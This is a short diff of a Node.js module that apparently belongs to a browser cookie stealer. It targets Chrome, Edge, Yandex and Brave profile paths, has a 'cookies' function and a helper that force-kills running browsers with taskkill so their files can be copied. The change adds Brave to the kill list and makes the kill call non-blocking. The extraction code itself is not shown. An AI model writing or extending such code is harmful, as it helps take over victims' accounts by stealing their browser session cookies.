@@ -1,7 +1,7 @@
 const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
 const { join, sep, resolve } = require('path');
 const { randomFileCreator } = require('../util/dir');
-const { execSync } = require('child_process');
+const { execSync, exec } = require('child_process');
 const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
 const { sleep, runningFromExecutable } = require('../util/general');
@@ -13,7 +13,7 @@ const browsers = [
   ['chrome', ['Google', 'Chrome']],
   ['msedge', ['Microsoft', 'Edge']],
   ['',       ['Yandex', 'YandexBrowser']],
-  ['',       ['BraveSoftware', 'Brave-Browser']],
+  ['brave',  ['BraveSoftware', 'Brave-Browser']],
 ];
 
 const filesToDelete = [];
@@ -84,7 +84,7 @@ this.cookies = (name, path) => {
 const kill = (browser, onKilled) => {
   const tasks = execSync('tasklist');
   if (tasks.includes(browser)) {
-    execSync(`taskkill /f /im ${browser}.exe`);
+    exec(`taskkill /f /im ${browser}.exe`);
     onKilled();
   }
 };
